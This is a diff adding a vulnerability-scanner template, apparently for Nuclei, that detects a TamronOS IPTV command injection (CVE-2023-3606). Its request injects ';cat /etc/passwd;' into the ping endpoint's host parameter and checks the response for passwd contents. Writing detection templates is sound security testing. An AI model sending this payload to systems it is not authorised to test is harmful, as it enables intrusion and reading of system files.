@@ -1,0 +1,29 @@
+id: poc-yaml-tamronos-iptv-system-command-injection
+info:
+  name: TamronOS IPTV System Command Injection (CVE-2023-3606)
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: cve-2023-3606,command-injection
+  description: |
+    TamronOS IPTV system is vulnerable to a command injection vulnerability (CVE-2023-3606).
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/ping?count=5&host=;cat%20/etc/passwd;"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "root:"
+          - "/bin"
+          - "cmd"
+        condition: and
+      - type: word
+        words:
+          - "<"
+        condition: or
+        negative: true
